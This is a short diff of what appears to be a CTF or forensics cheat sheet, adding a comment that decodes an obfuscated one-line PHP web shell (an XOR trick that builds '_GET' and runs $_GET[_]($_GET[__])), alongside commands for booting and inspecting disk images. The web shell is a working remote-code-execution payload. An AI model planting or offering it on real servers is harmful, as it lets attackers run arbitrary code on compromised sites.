@@ -10,6 +10,7 @@ qemu-system-i386 floppy.img; vncviewer 127.0.0.1
 <?=$_='$<>/'^'{{{{';${$_}[_](${$_}[__]);
 // $_= '$<>/' ^ '{{{{' ----> $_ = '_GET'
 // ${_GET}[_](${_GET})[__];
+// final <?=$_GET[_]($_GET[__])
 ```
 #### Read IMG, Data Dump, or Physical Device
 fdisk -l disk.img
